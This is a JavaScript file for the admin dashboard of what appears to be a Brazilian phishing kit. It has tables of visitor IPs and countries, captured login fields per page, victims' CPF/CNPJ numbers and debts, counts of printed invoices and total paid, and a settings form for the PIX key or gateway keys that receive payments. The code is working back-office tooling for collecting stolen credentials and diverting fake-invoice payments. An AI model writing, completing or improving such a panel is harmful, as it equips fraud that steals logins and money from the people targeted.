// Application State
let currentPage = 1;
const itemsPerPage = 10;
let filteredData = [...tableData];
let isConfigOpen = false;

// Configuration State
var config = {
    secretKey: '',
    publicKey: '',
    webRouterUrl: '',
    apiEndpoint: '',
    webhookUrl: ''
};

// DOM Elements
const configBtn = document.getElementById('configBtn');
const configModal = document.getElementById('configModal');
const closeModal = document.getElementById('closeModal');
const cancelConfig = document.getElementById('cancelConfig');
const saveConfig = document.getElementById('saveConfig');
const searchInput = document.getElementById('searchInput');
const statusFilter = document.getElementById('statusFilter');
const tableBody = document.getElementById('tableBody');
const pagination = document.getElementById('pagination');
const paginationInfo = document.getElementById('paginationInfo');
const prevBtn = document.getElementById('prevBtn');
const nextBtn = document.getElementById('nextBtn');
const lastUpdate = document.getElementById('lastUpdate');
const toastContainer = document.getElementById('toastContainer');

// Configuration form elements
const secretKeyInput = document.getElementById('secretKey');
const publicKeyInput = document.getElementById('publicKey');
const webRouterUrlInput = document.getElementById('webRouterUrl');
const apiEndpointInput = document.getElementById('apiEndpoint');
const webhookUrlInput = document.getElementById('webhookUrl');
const plataformaInput = document.getElementById('gatewayPlatform');

const chavepixnomeInput = document.getElementById('chavepixnome');
const chavepixCidadeInput = document.getElementById('chavepixCidade');
const chavepixInput = document.getElementById('chavepix');

const toggleSecretBtn = document.getElementById('toggleSecret');
const copySecretBtn = document.getElementById('copySecret');
const copyPublicBtn = document.getElementById('copyPublic');
const generateUrlBtn = document.getElementById('generateUrl');
const configStatus = document.getElementById('configStatus');
const lastSaved = document.getElementById('lastSaved');

// Initialize Application

function initializeApp() {
     updateStats();
    filterAndPaginateData();
    renderTable();
    updatePagination();
    renderTableAcessos();
    renderTableLogins();
}

function setupEventListeners() {
    // Modal events
    if (configBtn) configBtn.addEventListener('click', openConfigModal);
    if (closeModal) closeModal.addEventListener('click', closeConfigModal);
    if (cancelConfig) cancelConfig.addEventListener('click', closeConfigModal);
    if (saveConfig) saveConfig.addEventListener('click', saveConfiguration);
    
    // Close modal on overlay click
    if (configModal) {
        configModal.addEventListener('click', (e) => {
            if (e.target === configModal) {
                closeConfigModal();
            }
        });
    }
    
    // Search and filter events
    searchInput.addEventListener('input', debounce(handleSearch, 300));
    statusFilter.addEventListener('change', handleFilter);
    
    // Pagination events
    prevBtn.addEventListener('click', () => changePage(-1));
    nextBtn.addEventListener('click', () => changePage(1));
    
    // Configuration form events
    secretKeyInput.addEventListener('input', validateForm);
    publicKeyInput.addEventListener('input', validateForm);
    webRouterUrlInput.addEventListener('input', validateForm);
    apiEndpointInput.addEventListener('input', validateForm);
    webhookUrlInput.addEventListener('input', validateForm);
    
    toggleSecretBtn.addEventListener('click', toggleSecretVisibility);
    copySecretBtn.addEventListener('click', () => copyToClipboard(secretKeyInput.value, 'Chave secreta'));
    copyPublicBtn.addEventListener('click', () => copyToClipboard(publicKeyInput.value, 'Chave pública'));
    generateUrlBtn.addEventListener('click', generateSampleUrl);
    
    // Escape key to close modal
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && isConfigOpen) {
            closeConfigModal();
        }
    });
}

function renderTableAcessos() {
  const tbody = document.getElementById('tableBodyAcessos');
  tbody.innerHTML = '';
  acessosData.forEach(item => {
    const row = document.createElement('tr');
    row.innerHTML = `
      <td>${item.id}</td>
      <td>${item.ip}</td>
      <td>${item.povedor}</td>
      <td>${item.pais}</td>
      <td>${item.hora}</td>
      <td>${item.cont}</td>
      <td>${item.identity}</td>
      <td>${item.page}</td>
      <td>
        <div class="action-buttons">
            <button class="btn-icon danger" onclick="deleteItem(${item.id}, 'acessos')" title="Excluir">
                <i data-lucide="trash-2"></i>
            </button>
        </div>
     </td>
    `;
    tbody.appendChild(row);
  });
}

async function fetchPainelDataFromServer() {
    try {
        const params = new URLSearchParams({
            action: 'getPainel',
            pageAcessos: currentPage,   // você pode criar variáveis separadas para cada tabela
            limitAcessos: itemsPerPage,
            pageLogins: currentPage,
            limitLogins: itemsPerPage,
            pageTable: currentPage,
            limitTable: itemsPerPage
        });

        const res = await fetch(`painel_functions.php?${params}`);
        const data = await res.json();

        // Dashboard
        dashboardStats = data.dashboard;
        config = data.configuracoes;
        // Tabelas
        acessosData = data.acessos.data;
        loginsData = data.logins.data.map(item => {
            // Garante que login_info é um array
            if (item.login_info) {
                try {
                    item.logins = JSON.parse(item.login_info); 
                } catch {
                    item.logins = [];
                }
            } else {
                item.logins = [];
            }
            return item;
        });
        tableData = data.tableData.data;

        // Renderiza
        updateStats();
        filterAndPaginateData();
        renderTable();
        renderTableAcessos();
        renderTableLogins();
        updatePagination();
    } catch (err) {
        console.error('Erro ao buscar dados do servidor:', err);
    }
}

function renderTableLogins() {
  const tbody = document.getElementById('tableBodylogins');
  tbody.innerHTML = '';

  loginsData.forEach(item => {
    const row = document.createElement('tr');
    var loginDados = '';
    item.logins.forEach(dados => {
        loginDados +=  `<div class="logbox"><label>${dados.label}</label><div>${dados.value}</div></div>`;
    });

    row.innerHTML = `
      <td>${item.id}</td>
      <td>${item.page}</td>
      <td class="center" style="gap: 12px;">${loginDados}</td>
      <td>${item.dados}</td>
      <td>${item.debitos}</td>
      <td>${item.ip}</td>
      <td>${item.pais}</td>
      <td>${item.identity}</td>
      <td>${item.hora}</td>
      <td>
        <div class="action-buttons">
            <button class="btn-icon danger" onclick="deleteItem(${item.id}, 'logins')" title="Excluir">
                <i data-lucide="trash-2"></i>
            </button>
        </div>
     </td>
    `;
    tbody.appendChild(row);
  });

}

function updateStats() {
    document.getElementById('totalPaid').textContent = formatCurrency(dashboardStats.totalPaid);
    document.getElementById('invoicesPrinted').textContent = dashboardStats.invoicesPrinted;
    document.getElementById('totalLogins').textContent = dashboardStats.totalLogins;
    document.getElementById('totalAcessos').textContent = dashboardStats.totalAcessos;
}

function handleSearch() {
    const searchTerm = searchInput.value.toLowerCase();
    filteredData = tableData.filter(item => {
        return item.nome.toLowerCase().includes(searchTerm) ||
               item.identity.toLowerCase().includes(searchTerm) ||
               item.cpf_cnpj.includes(searchTerm);
    });
    
    // Apply status filter as well
    if (statusFilter.value !== 'all') {
        filteredData = filteredData.filter(item => item.status === statusFilter.value);
    }
    
    currentPage = 1;
    renderTable();
    updatePagination();
}

function handleFilter() {
    const status = statusFilter.value;
    const searchTerm = searchInput.value.toLowerCase();
    
    filteredData = tableData.filter(item => {
        const matchesSearch = item.nome.toLowerCase().includes(searchTerm) ||
                            item.identity.toLowerCase().includes(searchTerm) ||
                            item.cpf_cnpj.includes(searchTerm);
        const matchesStatus = status === 'all' || item.status === status;
        return matchesSearch && matchesStatus;
    });
    
    currentPage = 1;
    renderTable();
    updatePagination();
}

function filterAndPaginateData() {
    // This function is called on initial load
    filteredData = [...tableData];
}

function renderTable() {
    const startIndex = (currentPage - 1) * itemsPerPage;
    const endIndex = startIndex + itemsPerPage;
    const paginatedData = filteredData.slice(startIndex, endIndex);
    
    tableBody.innerHTML = '';
    
    paginatedData.forEach(item => {
        const row = document.createElement('tr');
        row.innerHTML = `
            <td>${item.id}</td>
            <td>${item.cpf_cnpj}</td>
            <td class="nome">${item.nome}</td>
            <td>${item.debito}</td>
            <td class="valor-pago">${formatCurrency(item.valor_pago)}</td>
            <td>${item.ip}</td>
            <td>${item.pais}</td>
            <td>${item.identity}</td>
            <td>${item.hora}</td>
            <td>
                <div class="action-buttons">
                    <span class="status-badge ${getStatusColor(item.status)}">
                        ${item.status.charAt(0).toUpperCase() + item.status.slice(1)}
                    </span>
                    <button class="btn-icon" onclick="editItem(${item.id})" title="Editar">
                        <i data-lucide="eye"></i>
                    </button>
                    <button class="btn-icon danger" onclick="deleteItem(${item.id}, 'table_data')" title="Excluir">
                        <i data-lucide="trash-2"></i>
                    </button>
                </div>
            </td>
        `;
        tableBody.appendChild(row);
    });
    
    // Reinitialize Lucide icons for new elements
    lucide.createIcons();
}

function updatePagination() {
    const totalPages = Math.ceil(filteredData.length / itemsPerPage);
    const startItem = ((currentPage - 1) * itemsPerPage) + 1;
    const endItem = Math.min(currentPage * itemsPerPage, filteredData.length);
    
    paginationInfo.textContent = `Mostrando ${startItem} a ${endItem} de ${filteredData.length} registros`;
    
    prevBtn.disabled = currentPage === 1;
    nextBtn.disabled = currentPage === totalPages || totalPages === 0;
    
    // Hide pagination if only one page
    pagination.style.display = totalPages <= 1 ? 'none' : 'flex';
}

function changePage(direction) {
    const totalPages = Math.ceil(filteredData.length / itemsPerPage);
    const newPage = currentPage + direction;
    
    if (newPage >= 1 && newPage <= totalPages) {
        currentPage = newPage;
        renderTable();
        updatePagination();
    }
}

function editItem(id) {
    showToast('Funcionalidade de edição será implementada em breve', 'info');
    console.log('Edit item with id:', id);
}

async function deleteItem(id, tb) {
    if (confirm('Tem certeza que deseja excluir este registro?')) {
        //showToast('Funcionalidade de exclusão será implementada em breve', 'info');

         const params = new URLSearchParams({action: 'delete', tb, id});

        const res = await fetch(`infor_actions.php?${params}`);
        const data = await res.json();

        if(data.success){
            fetchPainelData();
        }
    }
}

// Configuration Modal Functions
function openConfigModal() {
    isConfigOpen = true;
    configModal.classList.add('active');
    document.body.style.overflow = 'hidden';
}

function closeConfigModal() {
    isConfigOpen = false;
    configModal.classList.remove('active');
    document.body.style.overflow = 'auto';
}

function loadConfiguration(e) {
    const savedConfig = e;
    if (savedConfig) {

        try {

            config = savedConfig;

            secretKeyInput.value = config.secretKey || '';
            publicKeyInput.value = config.publicKey || '';
            webRouterUrlInput.value = config.webRouterUrl || '';
            apiEndpointInput.value = config.apiEndpoint || '';
            webhookUrlInput.value = config.webhookUrl || '';

            chavepixnomeInput.value = config.chavepixnome || '';
            chavepixCidadeInput.value = config.chavepixCidade || '';
            chavepixInput.value = config.chavepix || '';
            
            const select = document.getElementById("gatewayPlatform");

            if(config.plataforma){
                select.value = config.plataforma;
            }else{
                select.value = 'chavepix';
                ConfigModel(select.value);
            }
                select.dispatchEvent(new Event('change'));

            if (config.lastSaved) {
                updateLastSaved(config.lastSaved);
            }
            
            validateForm();
        } catch (error) {
            console.error('Error loading configuration:', error);
        }
    }
}

function saveConfiguration() {
    const saveBtn = saveConfig;
    const originalContent = saveBtn.innerHTML;
    
    // Show loading state
    saveBtn.disabled = true;
    saveBtn.innerHTML = `
        <div class="loading-spinner"></div>
        Salvando...
    `;
    
    // Simulate API call
    setTimeout( async() => {

        config.secretKey = secretKeyInput.value;
        config.publicKey = publicKeyInput.value;
        config.webRouterUrl = webRouterUrlInput.value;
        config.apiEndpoint = apiEndpointInput.value;
        config.webhookUrl = webhookUrlInput.value;
        config.chavepixnome = chavepixnomeInput.value;
        config.chavepixCidade = chavepixCidadeInput.value;
        config.chavepix = chavepixInput.value;
        config.plataforma = plataformaInput.value;
        config.lastSaved = new Date().toISOString();
        
        const res = await fetch("chave_functions.php", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                secretKey: config.secretKey,
                publicKey: config.publicKey,
                id_usuario: config.id_usuario,
                webRouterUrl: config.webRouterUrl,
                apiEndpoint: config.apiEndpoint,
                webhookUrl: config.webhookUrl,
                chavepixnome: config.chavepixnome,
                chavepixCidade: config.chavepixCidade,
                chavepix: config.chavepix,
                plataforma: config.plataforma,
                lastSaved: config.lastSaved
            })
        });
        
        const data = await res.json();

        localStorage.setItem('adminConfig', JSON.stringify(config));
        
        updateLastSaved(config.lastSaved);
        validateForm();
        
        showToast('Configurações salvas com sucesso!', 'success');
        
        // Reset button
        saveBtn.disabled = false;
        saveBtn.innerHTML = originalContent;
        
        // Reinitialize icons
        lucide.createIcons();
    }, 1000);
}

function validateForm() {
    const isValid = secretKeyInput.value.trim() && 
                    publicKeyInput.value.trim() && 
                    webhookUrl.value.trim() ||
                    chavepixnomeInput.value.trim() &&
                    chavepixCidadeInput.value.trim() &&
                    chavepixInput.value.trim();
    
    saveConfig.disabled = !isValid;
    updateConfigStatus(isValid);
}

function updateConfigStatus(isValid) {
    const statusIcon = configStatus.querySelector('.status-icon');
    const statusText = configStatus.querySelector('.status-text');
    const statusBadge = configStatus.querySelector('.status-badge');
    
    if (isValid) {
        statusIcon.setAttribute('data-lucide', 'check-circle');
        statusIcon.style.color = 'var(--accent-green)';
        statusText.textContent = 'Configuração válida';
        statusBadge.textContent = 'Pronto';
        statusBadge.className = 'status-badge status-ready';
    } else {
        statusIcon.setAttribute('data-lucide', 'alert-circle');
        statusIcon.style.color = 'var(--accent-amber)';
        statusText.textContent = 'Configuração incompleta';
        statusBadge.textContent = 'Pendente';
        statusBadge.className = 'status-badge status-pending';
    }
    
    lucide.createIcons();
}

function updateLastSaved(timestamp) {
    if (timestamp) {
        const date = new Date(timestamp);
        lastSaved.textContent = `Última atualização: ${date.toLocaleString('pt-BR')}`;
    }
}

function toggleSecretVisibility() {
    const isPassword = secretKeyInput.type === 'password';
    secretKeyInput.type = isPassword ? 'text' : 'password';
    
    const icon = toggleSecretBtn.querySelector('svg');
    icon.setAttribute('data-lucide', isPassword ? 'eye-off' : 'eye');
    lucide.createIcons();
}

function copyToClipboard(text, fieldName) {
    if (!text) {
        showToast(`${fieldName} está vazio`, 'error');
        return;
    }
    
    navigator.clipboard.writeText(text).then(() => {
        showToast(`${fieldName} copiado para a área de transferência!`, 'success');
    }).catch(() => {
        showToast('Erro ao copiar para a área de transferência', 'error');
    });
}

function generateSampleUrl() {
    const randomId = Math.random().toString(36).substring(7);
    const sampleUrl = `https://api.webrouter.com.br/v1/gateway/${randomId}`;
    webRouterUrlInput.value = sampleUrl;
    validateForm();
    showToast('URL sugerida gerada!', 'success');
}

function updateLastUpdateTime() {
    const now = new Date().toLocaleDateString('pt-BR');
    lastUpdate.textContent = `Última atualização: ${now}`;
}

// Toast Notification System
function showToast(message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    
    const icon = type === 'success' ? 'check-circle' : 
                type === 'error' ? 'x-circle' : 'info';
    
    toast.innerHTML = `
        <div class="toast-header">
            <i data-lucide="${icon}"></i>
            ${type === 'success' ? 'Sucesso' : type === 'error' ? 'Erro' : 'Informação'}
        </div>
        <div class="toast-body">${message}</div>
    `;
    
    toastContainer.appendChild(toast);
    lucide.createIcons();
    
    // Show toast
    setTimeout(() => toast.classList.add('show'), 100);
    
    // Hide and remove toast
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => {
            if (toast.parentNode) {
                toast.parentNode.removeChild(toast);
            }
        }, 300);
    }, 3000);
}

// Utility Functions
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}